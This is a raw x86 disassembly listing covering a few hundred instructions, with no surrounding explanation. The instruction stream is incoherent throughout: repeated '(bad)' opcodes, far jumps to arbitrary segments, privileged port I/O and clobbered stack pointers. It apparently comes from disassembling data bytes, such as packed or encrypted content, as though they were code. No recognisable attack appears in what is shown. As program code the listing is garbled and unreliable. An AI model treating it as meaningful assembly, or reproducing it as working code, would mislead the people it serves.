  416f4a:	xlat   BYTE PTR ds:[ebx]
  416f4b:	(bad)  [eax-0x5a]
  416f4e:	imul   eax,ecx
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	stos   BYTE PTR es:[edi],al
  416f6b:	lds    eax,FWORD PTR [edx+0x6a]
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0x7f70707e
  416f77:	or     eax,0xd8c68c59
  416f7c:	pop    ss
  416f7d:	cmp    eax,0x74f7f5d3
  416f82:	data16 data16 jb 0x416f9b
  416f86:	mul    DWORD PTR [ebx-0x3d199071]
  416f8c:	cld    
  416f8d:	cmp    BYTE PTR [ebx+edi*4+0x70a35339],ch
  416f94:	jge    0x416fb6
  416f96:	out    0x93,eax
  416f98:	addr16 pop ss
  416f9a:	pop    edi
  416f9b:	inc    edi
  416f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f9d:	push   ebx
  416f9e:	lods   al,BYTE PTR ds:[esi]
  416f9f:	and    ecx,esp
  416fa1:	(bad)  
  416fa2:	push   cs
  416fa3:	aad    0x49
  416fa5:	mov    al,ds:0x784c8e4a
  416faa:	(bad)  
  416fab:	mov    ecx,0x465531e8
  416fb0:	mov    bl,0x85
  416fb2:	pushf  
  416fb3:	or     al,0x6c
  416fb5:	add    edi,DWORD PTR [ecx+0x14988be6]
  416fbb:	mov    cl,0x2c
  416fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fbe:	mov    eax,0x1878eea6
  416fc3:	jg     0x417028
  416fc5:	jge    0x416fda
  416fc7:	sbb    BYTE PTR [ecx+0x1d],dh
  416fca:	dec    edx
  416fcb:	or     BYTE PTR [ebp-0x18],bh
  416fce:	jae    0x416f7b
  416fd0:	xor    eax,0xb7ae01f9
  416fd5:	scas   eax,DWORD PTR es:[edi]
  416fd6:	in     eax,0xa1
  416fd8:	mov    DWORD PTR [ecx],edi
  416fda:	cmp    eax,0xbc6d00ed
  416fdf:	imul   eax,DWORD PTR [ecx+0x1e],0x256cf26d
  416fe6:	fidiv  DWORD PTR [ebx+0x51]
  416fe9:	and    ah,0x83
  416fec:	mov    esp,0xbd5818f6
  416ff1:	jmp    0x416f7e
  416ff3:	sub    dl,bl
  416ff5:	mov    eax,ds:0xb27340a3
  416ffa:	adc    BYTE PTR [edx],dl
  416ffc:	jne    0x417021
  416ffe:	sbb    eax,DWORD PTR [ebp+0x5cc6d7a4]
  417004:	out    0x0,eax
  417006:	imul   ecx,DWORD PTR ds:0xb5479ebc,0x61
  41700d:	push   edx
  41700e:	mov    eax,ds:0x8ca712f0
  417013:	sbb    ebx,ebx
  417015:	xchg   ebx,eax
  417016:	stos   BYTE PTR es:[edi],al
  417017:	fldcw  WORD PTR [ebx]
  417019:	out    dx,al
  41701a:	fstp   TBYTE PTR ds:0x16b6a2a5
  417020:	jne    0x417063
  417022:	push   cs
  417023:	ja     0x417088
  417025:	frstor [edi+0x4]
  417028:	cmc    
  417029:	sbb    bl,ah
  41702b:	retf   
  41702c:	pushf  
  41702d:	inc    esi
  41702e:	ds iret 
  417030:	jbe    0x41706d
  417032:	add    al,0x3c
  417034:	das    
  417035:	pop    ss
  417036:	add    BYTE PTR [edi-0x12c2809e],bh
  41703c:	sub    DWORD PTR [ebp+0x1c],ecx
  41703f:	movsx  esi,BYTE PTR [eax+0x462ac019]
  417046:	hlt    
  417047:	sbb    DWORD PTR [ebx],ebx
  417049:	clc    
  41704a:	jno    0x416fd0
  41704c:	mov    bl,0x2e
  41704e:	imul   DWORD PTR [eax+0xc]
  417051:	mov    edi,0xe2b91cea
  417056:	xor    BYTE PTR [edx+0x6b7acca5],dh
  41705c:	mov    gs,WORD PTR [ecx+0x16974167]
  417062:	inc    esp
  417063:	jle    0x416fe5
  417065:	pop    ecx
  417066:	loop   0x4170b3
  417068:	jmp    0x18a9:0x6a6fd706
  41706f:	out    dx,al
  417070:	jo     0x41706b
  417072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417073:	in     al,dx
  417074:	mov    ecx,0x96dcee30
  417079:	pop    ebp
  41707a:	enter  0x47aa,0xa9
  41707e:	jb     0x4170cb
  417080:	pop    ds
  417081:	mov    al,0x6b
  417083:	and    al,0x22
  417085:	inc    esp
  417086:	cli    
  417087:	(bad)  
  417088:	aam    0xfb
  41708a:	push   0x12
  41708c:	imul   ecx,DWORD PTR [ebp-0x4df6b653],0x5
  417093:	lods   eax,DWORD PTR ds:[esi]
  417094:	int3   
  417095:	scas   al,BYTE PTR es:[edi]
  417096:	sub    ebp,DWORD PTR [edi+0x6c]
  417099:	and    eax,0x9df00baa
  41709e:	test   eax,0xb959a5e0
  4170a3:	rcl    BYTE PTR [ecx-0x218181c8],1
  4170a9:	xchg   esi,eax
  4170aa:	dec    ebx
  4170ab:	jno    0x417103
  4170ad:	pop    es
  4170ae:	les    eax,FWORD PTR [edx-0x56]
  4170b1:	fldenv [ebp+0x22358562]
  4170b7:	sub    al,0xfa
  4170b9:	sbb    esp,DWORD PTR [edx+0x5e]
  4170bc:	in     eax,0xc6
  4170be:	test   al,0x2d
  4170c0:	mov    ds:0xb9b19b83,eax
  4170c5:	or     BYTE PTR [edi+0x6596bbc],cl
  4170cb:	(bad)  
  4170cc:	jmp    0xbf05:0x7a57bb31
  4170d3:	(bad)  
  4170d4:	fild   DWORD PTR [esi+0x17573e81]
  4170da:	call   0x4697:0xc8a680a9
  4170e1:	jne    0x4170cd
  4170e3:	adc    BYTE PTR [bp+di-0x3f45],bl
  4170e8:	repz jne 0x4170bc
  4170eb:	rcl    BYTE PTR [esi+0x5c3af97],cl
  4170f1:	ror    DWORD PTR [ebx-0x7c],cl
  4170f4:	imul   eax,ebx,0x2909e9af
  4170fa:	in     al,dx
  4170fb:	mov    ebp,0xfdf88b8a
  417100:	test   BYTE PTR fs:[ebp-0x1e2daa54],cl
  417107:	rol    DWORD PTR [esi*2+0x161e7277],cl
  41710e:	popf   
  41710f:	ror    BYTE PTR [ecx+0x5fa72f9a],1
  417115:	push   ebp
  417116:	push   0xffffffb3
  417118:	push   es
  417119:	and    eax,0x7dcfe1ba
  41711e:	xor    edx,DWORD PTR [edi-0x7b]
  417121:	cmp    DWORD PTR [esi],ecx
  417123:	test   eax,0x99f12150
  417128:	es push esi
  41712a:	in     al,dx
  41712b:	xchg   ebp,eax
  41712c:	jmp    0xea29:0xf2f4bca1
  417133:	mov    esp,cs
  417135:	jo     0x41719e
  417137:	jbe    0x417104
  417139:	cli    
  41713a:	lea    ebp,[ebx]
  41713c:	fisubr DWORD PTR [esi-0x16cbdbb1]
  417142:	inc    ebp
  417143:	fist   DWORD PTR [ebp-0x51]
  417146:	(bad)  
  417147:	cdq    
  417148:	jmp    0xc9a1:0x2c3b
  41714e:	test   edx,esi
  417150:	push   edi
  417151:	or     esi,ebx
  417153:	std    
  417154:	pop    esi
  417155:	push   0xffffffcc
  417157:	adc    DWORD PTR ds:0x312e8783,ecx
  41715d:	adc    al,0x81
  41715f:	and    al,0x86
  417161:	fdivr  st,st(7)
  417163:	cmp    DWORD PTR [esi+ebp*4-0x7fe8fefa],esi
  41716a:	adc    ch,ah
  41716c:	and    ebp,ebp
  41716e:	and    DWORD PTR [ebp+ebx*2+0x1d48dd7b],0xffffffec
  417176:	dec    ecx
  417177:	sar    esp,0x45
  41717a:	mov    dh,0xff
  41717c:	mov    cl,0x1
  41717e:	js     0x41712a
  417180:	jae    0x41713d
  417182:	push   cs
  417183:	inc    ecx
  417184:	ficomp WORD PTR [edx+ebp*1+0x4c]
  417188:	jl     0x4171f1
  41718a:	adc    BYTE PTR [edi+0x577f746b],bh
  417190:	repnz neg esp
  417193:	jl     0x4171ad
  417195:	mov    ds:0x46138efe,al
  41719a:	lea    esp,[ebx]
  41719c:	push   edi
  41719d:	push   edi
  41719e:	jmp    0x1987d4f
  4171a3:	in     al,dx
  4171a4:	fcmovu st,st(1)
  4171a6:	ds push edx
  4171a8:	stc    
  4171a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171aa:	scas   eax,DWORD PTR es:[edi]
  4171ab:	pop    esi
  4171ac:	xor    DWORD PTR [edx],0x71
  4171af:	jmp    0x1415c8e7
  4171b4:	mov    dl,BYTE PTR es:[esi+0x1f40059c]
  4171bb:	mov    eax,ecx
  4171bd:	ret    
  4171be:	retf   
  4171bf:	xchg   ecx,eax
  4171c0:	dec    esi
  4171c1:	test   DWORD PTR gs:[esp+esi*1],esp
  4171c5:	cdq    
  4171c6:	pop    ecx
  4171c7:	push   ds
  4171c8:	stos   DWORD PTR es:[edi],eax
  4171c9:	mov    cl,0x5f
  4171cb:	leave  
  4171cc:	in     al,0x55
  4171ce:	in     eax,dx
  4171cf:	adc    BYTE PTR [ebp+0x2634dd43],0x56
  4171d6:	mov    ch,0xa9
  4171d8:	and    BYTE PTR [edx],bl
  4171da:	push   esi
  4171db:	je     0x41721a
  4171dd:	(bad)  
  4171de:	std    
  4171df:	loope  0x4171f1
  4171e1:	imul   esi,DWORD PTR [ecx],0x2c808782
  4171e7:	int3   
  4171e8:	sbb    eax,0x7e518a6e
  4171ed:	out    dx,al
  4171ee:	fldenvw [ecx+edi*4+0x1e98ebe1]
  4171f6:	xor    eax,0x113c00b0
  4171fb:	(bad)  
  4171fc:	loopne 0x4171dc
  4171fe:	dec    esp
  4171ff:	lea    edi,[ebp-0x41]
  417202:	hlt    
  417203:	enter  0xdaec,0xaf
  417207:	cmp    ah,cl
  417209:	cli    
  41720a:	jp     0x4171ae
  41720c:	push   cs
  41720d:	call   0xeeed4d76
  417212:	push   ecx
  417213:	neg    DWORD PTR [ecx-0x1d]
  417216:	pop    esp
  417217:	dec    esp
  417218:	repz mov eax,ds:0xa6de6a35
  41721e:	es sbb bl,bl
  417221:	imul   al
  417223:	push   edx
  417224:	retf   0x240b
  417227:	enter  0x62e3,0xbd
  41722b:	inc    esp
  41722c:	ret    
  41722d:	call   0x3561abcf
  417232:	cdq    
  417233:	lock mov ?,WORD PTR [eax-0x3c1ad380]
  41723a:	dec    edx
  41723b:	call   0x384bd24
  417240:	sbb    al,0x1a
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	xor    dh,BYTE PTR [ecx-0x9]
  417257:	xor    DWORD PTR [eax+0x26],0x7f
  41725b:	jo     0x417216
  41725d:	jle    0x4172cf
  41725f:	jo     0x417278
  417261:	or     eax,0xf616185a
  417266:	int    0x16
  417268:	jnp    0x417228
  41726a:	inc    ebx
  41726b:	xor    ebx,DWORD PTR [ecx-0x3d]
  41726e:	xor    eax,0x2e414e64
  417273:	in     eax,0x2a
  417275:	lds    edx,FWORD PTR [eax+0x4d]
  417278:	xchg   ecx,edx
  41727a:	and    edx,DWORD PTR [edi-0x12e4b144]
  417280:	push   edx
  417281:	adc    bl,dl
  417283:	ja     0x417292
  417285:	jo     0x417265
  417287:	push   ss
  417288:	mov    ?,WORD PTR [ebx+0x67a85b3b]
  41728e:	xchg   BYTE PTR [edi+0x3e],ch
  417291:	loop   0x4172ed
  417293:	scas   eax,DWORD PTR es:[edi]
  417294:	gs xchg ebx,eax
  417296:	pop    es
  417297:	mov    al,ds:0x327cdd5b
  41729c:	mov    edi,0xafaea8a1
  4172a1:	jg     0x41731d
  4172a3:	push   edx
  4172a4:	loopne 0x417302
  4172a6:	daa    
  4172a7:	pop    esi
  4172a8:	(bad)
  4172ab:	clc    
  4172ac:	cmp    edx,ebx
  4172ae:	or     BYTE PTR [eax-0x1c6ee834],ch
  4172b4:	xchg   BYTE PTR [ebx-0x63f67d57],bh
  4172ba:	jne    0x41725e
  4172bc:	xchg   BYTE PTR [esi+0x42de0ff0],al
  4172c2:	(bad)  
  4172c3:	xor    dh,BYTE PTR [edx+0x4028c252]
  4172c9:	mov    esp,0x288f9ba8
  4172ce:	ficomp DWORD PTR [ebp+0x52d0cbf5]
  4172d4:	fwait
  4172d5:	xchg   DWORD PTR [ecx+0x47],edi
  4172d8:	jae    0x4172f5
  4172da:	cmp    BYTE PTR [edx+0x2a],dh
  4172dd:	and    eax,0x744a71b8
  4172e2:	leave  
  4172e3:	in     al,dx
  4172e4:	mov    cl,0x74
  4172e6:	pop    edx
  4172e7:	(bad)  
  4172e8:	rcl    BYTE PTR [eax-0x49],1
  4172eb:	test   DWORD PTR [ebx],eax
  4172ed:	loopne 0x417330
  4172ef:	sbb    al,BYTE PTR [edi]
  4172f1:	aaa    
  4172f2:	bound  ebp,QWORD PTR [ecx+0x554a22b4]
  4172f8:	retf   
  4172f9:	xchg   BYTE PTR [ecx],cl
  4172fb:	into   
  4172fc:	int    0xf3
  4172fe:	sar    edi,0xd4
  417301:	or     al,al
  417303:	xor    BYTE PTR [eax-0x38],dl
  417306:	clc    
  417307:	(bad)  
  41730b:	fbstp  TBYTE PTR [edi+0x27f07437]
  417311:	rcl    DWORD PTR [ecx],0xb5
  417314:	popf   
  417315:	cmp    BYTE PTR [edx],0x70
  417318:	xchg   ecx,eax
  417319:	cld    
  41731a:	or     ebx,DWORD PTR [edx+edx*8]
  41731d:	int    0x3f
  41731f:	(bad)  
  417320:	fsubr  DWORD PTR [esi]
  417322:	adc    BYTE PTR [edx-0x62971877],al
  417328:	jno    0x4172ed
  41732a:	retf   0x7bde
  41732d:	and    DWORD PTR [edi-0x56b149a4],ebp
  417333:	mov    ebp,0x2fbc9720
  417338:	cmp    ebx,ecx
  41733a:	adc    ebp,DWORD PTR [esi+0x35]
  41733d:	in     al,0x5d
  41733f:	loopne 0x417306
  417341:	dec    ebp
  417342:	mov    dl,0xc9
  417344:	inc    esp
  417345:	repnz test al,0x50
  417348:	stos   DWORD PTR es:[edi],eax
  417349:	scas   al,BYTE PTR es:[edi]
  41734a:	test   eax,0x3d578934
  417350:	mov    ah,0x3
  417352:	ins    DWORD PTR es:[edi],dx
  417353:	icebp  
  417354:	stos   BYTE PTR es:[edi],al
  417355:	sub    eax,ebp
  417357:	cwde   
  417358:	das    
  417359:	je     0x4172df
  41735b:	mov    eax,ds:0x8b997883
  417360:	jle    0x4173af
  417362:	cmp    eax,ebx
  417364:	popf   
  417365:	shr    BYTE PTR [esi-0xb],cl
  417368:	inc    esi
  417369:	retf   
  41736a:	push   edi
  41736b:	mul    DWORD PTR [esi+ebp*1-0x7b]
  41736f:	mov    ecx,DWORD PTR [edx-0x499d0e23]
  417375:	gs add al,0xfe
  417378:	comiss xmm6,DWORD PTR [esi+0x59991882]
  41737f:	aam    0xa0
  417381:	cs in  al,0x60
  417384:	je     0x41734c
  417386:	sbb    DWORD PTR [ebx+0x220acb97],esp
  41738c:	out    0x15,eax
  41738e:	fnstcw WORD PTR ds:0x8cbb2189
  417394:	jge    0x41738b
  417396:	test   BYTE PTR [esi-0x575c3485],dl
  41739c:	mov    esp,DWORD PTR [edi-0x2b99d3c5]
  4173a2:	ss inc ecx
  4173a4:	mov    esp,0xb1c9aae5
  4173a9:	dec    edi
  4173aa:	sbb    eax,0x92d6323f
  4173af:	shl    DWORD PTR [esi-0x65ac160],cl
  4173b5:	retf   0xc7d5
  4173b8:	dec    edx
  4173b9:	xchg   ecx,eax
  4173ba:	jg     0x41733e
  4173bc:	adc    ebp,DWORD PTR [eax]
  4173be:	mov    ch,0xa2
  4173c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173c1:	or     eax,0xd0f17822
  4173c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173c7:	push   eax
  4173c8:	or     al,0x12
  4173ca:	daa    
  4173cb:	xchg   ebp,eax
  4173cc:	push   ss
  4173cd:	push   ss
  4173ce:	jl     0x4173d0
  4173d0:	jbe    0x41740c
  4173d2:	xchg   ebp,eax
  4173d3:	mov    eax,0xf496b12f
  4173d8:	fstp   QWORD PTR [ebx-0x8]
  4173db:	cmp    DWORD PTR [ecx+0x66],esi
  4173de:	dec    ebp
  4173df:	and    al,0x53
  4173e1:	xor    dh,BYTE PTR [esi+0x6efb1a5d]
  4173e7:	jmp    0x4173fb
  4173e9:	jle    0x417407
  4173eb:	(bad)
  4173ee:	push   0x6f5a155a
  4173f3:	int3   
  4173f4:	xor    ecx,DWORD PTR [esi-0x9486881]
  4173fa:	jl     0x4173be
  4173fc:	test   esp,eax
  4173fe:	xchg   esp,eax
  4173ff:	xor    DWORD PTR [ecx+0x5d3f24d6],esi
  417405:	cdq    
  417406:	int    0xa8
  417408:	ror    DWORD PTR [edx-0x116d846a],cl
  41740e:	mov    esp,0xd30281d3
  417413:	repnz inc eax
  417415:	add    dh,BYTE PTR [eax+edx*4]
  417418:	sbb    eax,ebp
  41741a:	jmp    FWORD PTR [edi-0x48]
  41741d:	xor    esi,DWORD PTR [eax-0x1a]
  417420:	and    ecx,DWORD PTR [esi]
  417422:	icebp  
  417423:	int3   
  417424:	push   esp
  417425:	mov    esi,0xcf1d463d
  41742a:	xchg   esp,eax
  41742b:	mov    esp,0xfa2a0bdf
  417430:	out    dx,al
  417431:	and    esi,DWORD PTR [eax-0x6f]
  417434:	pushf  
  417435:	cs ret 0x97dc
  417439:	mov    esi,?
  41743b:	stos   DWORD PTR es:[edi],eax
  41743c:	call   0x14a11595
  417441:	cmp    al,0x53
  417443:	por    mm7,mm5
  417446:	dec    ebx
  417447:	mov    bh,0x43
  417449:	in     al,dx
  41744a:	popa   
  41744b:	push   cs
  41744c:	mov    dl,0xc9
  41744e:	rcl    eax,cl
  417450:	mov    cl,bh
  417452:	mov    ah,0x42
  417454:	aas    
  417455:	stos   BYTE PTR es:[edi],al
  417456:	adc    al,0x86
  417458:	je     0x417460
  41745a:	fstp   TBYTE PTR [eax-0x5d]
  41745d:	xor    eax,0x929e6ccd
  417462:	mov    edx,0x4ebac173
  417467:	jno    0x417464
  417469:	push   esp
  41746a:	mov    ebp,0x8d838302
  41746f:	je     0x417496
  417471:	adc    BYTE PTR [esi+eiz*2-0x7369f291],dh
  417478:	fdivr  QWORD PTR [ecx-0x5e1780bd]
  41747e:	repnz mov edi,0xb6c5a511
  417484:	(bad)  [edx+0x40]
  417487:	jg     0x417441
  417489:	mov    ds:0x1d83642a,al
  41748e:	adc    BYTE PTR [eax],al
  417490:	test   eax,0x6ae0bc2e
  417495:	in     eax,0x5d
  417497:	cmp    al,0x87
  417499:	add    esi,0xffffffed
  41749c:	xor    al,0x38
  41749e:	clc    
  41749f:	out    dx,eax
  4174a0:	(bad)  
  4174a1:	mov    eax,ds:0xdd6f7d5d
  4174a6:	jb     0x4174a5
  4174a8:	rol    bh,1
  4174aa:	sbb    BYTE PTR [esi],al
  4174ac:	xor    DWORD PTR [ecx],0xffffffee
  4174af:	out    0x21,eax
  4174b1:	mov    ds:0x30284020,eax
  4174b6:	pop    ebx
  4174b7:	mov    ch,0x71
  4174b9:	add    ebx,DWORD PTR [ebp-0x2870b005]
  4174bf:	bound  eax,QWORD PTR [esi+0x17e3d5c0]
  4174c5:	add    edi,DWORD PTR [edx]
  4174c7:	retf   
  4174c8:	in     eax,0x93
  4174ca:	adc    dh,BYTE PTR [ebx-0x6ed1e382]
  4174d0:	push   cs
  4174d1:	rcl    ebx,0xab
  4174d4:	inc    eax
  4174d5:	or     ah,BYTE PTR [esp+edx*8+0x26]
  4174d9:	cwde   
  4174da:	cmp    edi,edx
  4174dc:	repnz sub esp,DWORD PTR [eax+edi*4]
  4174e0:	dec    eax
  4174e1:	jno    0x4174f7
  4174e3:	dec    esi
  4174e4:	sub    DWORD PTR [edi],eax
  4174e6:	sbb    eax,0xd624ee99
  4174eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174ec:	ds scas eax,DWORD PTR es:[edi]
  4174ee:	dec    ebp
  4174ef:	jne    0x4174fd
  4174f1:	out    0xc5,eax
  4174f3:	pause  
  4174f5:	sti    
  4174f6:	jo     0x4174ed
  4174f8:	inc    ecx
  4174f9:	ins    DWORD PTR es:[edi],dx
  4174fa:	xchg   edi,eax
  4174fb:	pushf  
  4174fc:	sbb    dl,dl
  4174fe:	setb   BYTE PTR [edx]
  417501:	xchg   esp,eax
  417502:	bound  ebx,QWORD PTR [ecx]
  417504:	pushf  
  417505:	jbe    0x41755f
  417507:	jo     0x4174a3
  417509:	and    BYTE PTR [ebx],bh
  41750b:	or     ecx,ecx
  41750d:	dec    eax
  41750e:	adc    DWORD PTR fs:[ecx],ebx
  417511:	loopne 0x4174dc
  417513:	rol    cl,cl
  417515:	pushf  
  417516:	fwait
  417517:	inc    ecx
  417518:	pop    es
  417519:	shl    DWORD PTR [edi+0x1fce46a3],0x1b
  417520:	dec    esp
  417521:	dec    edx
  417522:	or     eax,0x4c476ac4
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [eax],edi
  417543:	sahf   
  417544:	into   
  417545:	ud1    esp,DWORD PTR [edi+edi*2]
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x417546
  41754f:	sbb    BYTE PTR [edx-0x6a],0xaf
  417553:	shl    al,0xb9
  417556:	xchg   edi,eax
  417557:	mov    al,0xd2
  417559:	sbb    ebp,DWORD PTR [edx-0x4f0114a7]
  41755f:	jnp    0x417537
  417561:	popf   
  417562:	outs   dx,BYTE PTR ds:[esi]
  417563:	aas    
  417564:	cmp    BYTE PTR [ebx],0xe1
  417567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417568:	and    BYTE PTR [edx],0x64
  41756b:	push   ebp
  41756c:	daa    
  41756d:	or     dl,bl
  41756f:	inc    ebx
  417570:	test   eax,0x44ea6972
  417575:	mov    al,ds:0x9a1770bb
  41757a:	xlat   BYTE PTR ds:[ebx]
  41757b:	adc    ecx,DWORD PTR [esi]
  41757d:	cmp    DWORD PTR [eax+ebx*4+0x5b],ebp
  417581:	ficom  DWORD PTR [ecx+0x66]
  417584:	shl    cl,0x35
  417587:	jns    0x417581
  417589:	ret    
  41758a:	test   DWORD PTR [ecx+ecx*8],esp
  41758d:	pusha  
  41758e:	cs ja  0x417564
  417591:	jp     0x41760a
  417593:	fst    QWORD PTR [edx+0x6]
  417596:	test   BYTE PTR [esi+0x11634032],bl
  41759c:	push   esp
  41759d:	stc    
  41759e:	cmc    
  41759f:	inc    ebx
  4175a0:	retf   0x3788
  4175a3:	in     eax,0xa4
  4175a5:	or     eax,0xc067964d
  4175aa:	fs scas eax,DWORD PTR es:[edi]
  4175ac:	fld    DWORD PTR [edi]
  4175ae:	out    dx,eax
  4175af:	jle    0x8c5787c3
  4175b5:	into   
  4175b6:	into   
  4175b7:	cwde   
  4175b8:	push   esp
  4175b9:	xchg   ebp,eax
  4175ba:	xchg   edi,eax
  4175bb:	jmp    0x417616
  4175bd:	addr16 call 0x34997dc0
  4175c3:	push   eax
  4175c4:	sbb    al,0x97
  4175c6:	mov    bl,0x2b
  4175c8:	adc    dl,BYTE PTR [esi]
  4175ca:	mov    ecx,DWORD PTR [ebx+0x63]
  4175cd:	dec    eax
  4175ce:	lea    edi,[edi]
  4175d0:	(bad)  
  4175d1:	loopne 0x417597
  4175d3:	cmp    eax,0x7c55963
  4175d8:	jge    0x4175ea
  4175da:	jp     0x41758a
  4175dc:	xor    dh,BYTE PTR [edx]
  4175de:	or     eax,0x9f1da3d2
  4175e3:	lods   eax,DWORD PTR ds:[esi]
  4175e4:	test   BYTE PTR [ebp-0x43],bl
  4175e7:	outs   dx,BYTE PTR ds:[esi]
  4175e8:	dec    edx
  4175e9:	add    dl,BYTE PTR [esi-0x70d311c5]
  4175ef:	jb     0x417635
  4175f1:	adc    cl,BYTE PTR [ebx]
  4175f3:	pusha  
  4175f4:	mov    ecx,0xdc04ee7
  4175f9:	or     ah,bl
  4175fb:	aaa    
  4175fc:	mov    ds:0xe29d1fae,eax
  417601:	pop    es
  417602:	mov    al,ds:0xe3b04823
  417607:	std    
  417608:	dec    edi
  417609:	sub    BYTE PTR [eax],bl
  41760b:	sub    DWORD PTR [ebx],edi
  41760d:	lods   eax,DWORD PTR ds:[esi]
  41760e:	in     al,dx
  41760f:	sahf   
  417610:	int    0xe9
  417612:	dec    esi
  417613:	loop   0x417620
  417615:	test   eax,0x512c4b57
  41761a:	popa   
  41761b:	push   eax
  41761c:	inc    dh
  41761e:	test   edi,esi
  417620:	fwait
  417621:	ror    DWORD PTR [esi],1
  417623:	jbe    0x4175b6
  417625:	dec    eax
  417626:	push   ds
  417627:	xchg   ebp,eax
  417628:	cmp    DWORD PTR ss:[ebx+0x16],ecx
  41762c:	adc    dl,BYTE PTR es:[ebx-0x3f]
  417630:	xchg   esi,eax
  417631:	push   ss
  417632:	dec    ebx
  417633:	shl    BYTE PTR [edi+0x7811363c],1
  417639:	ds nop
  41763b:	xchg   ebp,eax
  41763c:	sub    eax,DWORD PTR [edx-0x78]
  41763f:	xor    al,0xb0
  417641:	xchg   esi,eax
  417642:	mov    ds:0xeeedf076,al
  417647:	jl     0x417634
  417649:	lock xchg esi,eax
  41764b:	add    ebx,eax
  41764d:	bound  ebx,QWORD PTR [ebp-0x56bda950]
  417653:	inc    eax
  417654:	popf   
  417655:	lahf   
  417656:	cmp    al,0x3f
  417658:	adc    eax,0xae269ab8
  41765d:	push   esi
  41765e:	jecxz  0x4175f2
  417660:	xchg   DWORD PTR [eax-0x55],esp
  417663:	daa    
  417664:	dec    esi
  417665:	push   ebp
  417666:	iret   
  417667:	inc    edi
  417668:	popf   
  417669:	sub    ebx,DWORD PTR ds:0xf661dc85
  41766f:	push   esi
  417670:	ja     0x417684
  417672:	in     eax,0x4
  417674:	stos   BYTE PTR es:[edi],al
  417675:	std    
  417676:	gs retf 
  417678:	cmp    bh,al
  41767a:	into   
  41767b:	mov    ebx,0xf5b0b80
  417680:	in     al,0x86
  417682:	mov    dl,0x4
  417684:	push   esi
  417685:	dec    esi
  417686:	mov    dh,0x56
  417688:	mov    DWORD PTR [esi+0x65],edx
  41768b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41768c:	mov    esp,0x14be9329
  417691:	add    al,0x9
  417693:	cmp    dh,BYTE PTR [ecx+ebp*4+0x31]
  417697:	in     eax,0x36
  417699:	cwde   
  41769a:	xor    eax,0x35c80122
  41769f:	fadd   st,st(5)
  4176a1:	xor    bl,BYTE PTR ds:0x54f306f6
  4176a7:	push   0x8643029d
  4176ac:	xchg   esi,eax
  4176ad:	retf   0xc34e
  4176b0:	inc    esi
  4176b1:	dec    ebx
  4176b2:	and    al,BYTE PTR [ebx-0x9b42ba1]
  4176b8:	mov    edi,0x53d85896
  4176bd:	sub    al,0x28
  4176bf:	sub    DWORD PTR [edi-0x2c],eax
  4176c2:	mov    ebx,0x5b2d6979
  4176c7:	cdq    
  4176c8:	and    esp,0xa
  4176cb:	les    ecx,FWORD PTR [edx+0x15]
  4176ce:	jns    0x41766e
  4176d0:	sbb    DWORD PTR [edi+eiz*8-0x47],eax
  4176d4:	jno    0x417656
  4176d6:	fistp  WORD PTR [ecx]
  4176d8:	jns    0x417703
  4176da:	mov    ds:0x6fa5705,eax
  4176df:	es out 0xa8,al
  4176e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176e3:	sub    BYTE PTR [eax],cl
  4176e5:	xchg   edx,eax
  4176e6:	sub    DWORD PTR [esi+edx*4-0x18],edi
  4176ea:	dec    esi
  4176eb:	adc    eax,0x6d7671a1
  4176f0:	push   edi
  4176f1:	clc    
  4176f2:	mov    BYTE PTR [ebp+0x6a5af554],ch
  4176f8:	mov    cl,0xf0
  4176fa:	nop
  4176fb:	cmp    BYTE PTR [esi-0x884edd9],dl
  417701:	fnstsw WORD PTR [ebx+ebp*2+0x54]
  417705:	daa    
  417706:	mov    bh,0xa3
  417708:	jmp    0x45e6:0x32dc8522
  41770f:	sub    DWORD PTR [eax+esi*2+0x5e],0x9bc3f9f4
  417717:	adc    edx,DWORD PTR [eax+edx*1]
  41771a:	mov    WORD PTR [edx],ds
  41771c:	jno    0x4176a4
  41771e:	mov    edx,edx
  417720:	sbb    eax,ecx
  417722:	mov    esp,0x488aa7a0
  417727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417728:	pusha  
  417729:	push   esi
  41772a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41772b:	push   edi
  41772c:	cmp    eax,0x41175e9e
  417731:	ret    0x1f5f
  417734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417736:	ins    BYTE PTR es:[edi],dx
  417737:	cmp    DWORD PTR [edi+eiz*1+0x181e1f5f],0xffffffda
  41773f:	push   ebx
  417740:	inc    edi
  417741:	or     DWORD PTR [ecx-0x1e],esi
  417744:	mov    esi,0x2ce46fe3
  417749:	lock lock (bad) 
